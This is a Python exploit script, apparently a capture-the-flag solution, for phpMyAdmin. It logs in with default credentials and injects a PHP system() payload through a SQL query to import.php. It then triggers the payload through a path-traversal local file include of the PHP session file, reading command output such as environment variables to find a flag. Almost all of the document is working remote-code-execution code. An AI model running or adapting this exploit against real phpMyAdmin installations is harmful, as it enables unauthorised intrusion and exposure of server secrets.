#!/usr/bin/env python3
import re
import requests
import sys
import base64
import urllib.parse

def exploit(ipaddr, port, path, username='admin', password='123456', command='env'):
    flag = None
    url = f"http://{ipaddr}:{port}/{path}/"
    print(f"[+] Target: {url}")

    # Get initial token
    print(f"[+] Getting initial token...")
    r = requests.get(f"{url}index.php")
    token_match = re.search(r'token"\s*value="([^"]+)"', r.text)
    if not token_match:
        print("[-] Failed to get token")
        sys.exit(1)
    token = token_match.group(1)
    cookies = r.cookies

    # Login
    print(f"[+] Logging in as {username}...")
    r = requests.post(
        f"{url}index.php",
        data={"token": token, "pma_username": username, "pma_password": password},
        cookies=cookies
    )
    token_match = re.search(r'token"\s*value="([^"]+)"', r.text)
    if not token_match:
        print("[-] Login failed")
        sys.exit(1)
    token = token_match.group(1)
    cookies = r.cookies

    # Properly escape command for SQL and PHP
    safe_command = command.replace('"', '\\"')
    print(f"[+] Using command: {safe_command}")

    # Create a simple payload that will be easy to extract
    # payload = f"SELECT '<?php echo \"STARTOUTPUT\"; system(\"{safe_command}\"); echo \"ENDOUTPUT\"; exit; ?>';"
    # print(f"[+] Injecting PHP code...")

    # Alternative payload for complex commands:
    encoded_cmd = base64.b64encode(command.encode()).decode()
    payload = f"SELECT '<?php echo \"STARTOUTPUT\"; system(base64_decode(\"{encoded_cmd}\")); echo \"ENDOUTPUT\"; exit; ?>';"

    r = requests.post(
        f"{url}import.php",
        data={"token": token, "sql_query": payload},
        cookies=cookies
    )

    # Get session ID from cookies
    session_id = None
    for cookie_name, cookie_value in cookies.get_dict().items():
        if cookie_name == "phpMyAdmin":
            session_id = cookie_value
            break

    if not session_id:
        print("[-] Failed to get session ID")
        print(f"[-] Available cookies: {cookies.get_dict()}")
        sys.exit(1)
    print(f"[+] Session ID: {session_id}")

    # Using the confirmed path
    target_url = f"{url}index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{session_id}"
    print(f"[+] Executing: {target_url}")
    r = requests.get(target_url, cookies=cookies)


    # Save response for debugging
    with open("response.html", "w") as f:
        f.write(r.text)
    print(f"[+] Full response saved to response.html")

    # Look for our marker pattern
    output_pattern = r"STARTOUTPUT(.*?)ENDOUTPUT"
    match = re.search(output_pattern, r.text, re.DOTALL)
    if match:
        #print("\n[+] Command output:")
        output = match.group(1).strip()
        lines = output.split('\n')

        flag_found = False
        # Look for lines that might contain command output
        for line in lines:
            line = line.strip()
            if not line or len(line) < 5 or line.startswith(('<', ')', '(', '#', '/')):
                    continue

            # Look for FLAG in the line using regex
            flag_match = re.search(r'FLAG\s*=\s*(flag\{[A-Za-z0-9_\-+=]+\})', line)

            if flag_match:
                flag = flag_match.group(0)
                flag_found = True


        if not flag_found:
            print("[-] Could not find FLAG in raw output.")
    return flag

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python exploit.py <ip> <port> <path>")
        sys.exit(1)
    host_ip = sys.argv[1]
    port = sys.argv[2]
    path = sys.argv[3]
    flag = exploit(host_ip, port, path)
    if flag:
        print(f"[*] Exploit successful\n Flag obtained: {flag}")
    else:
        print("[!] Exploit failed!")
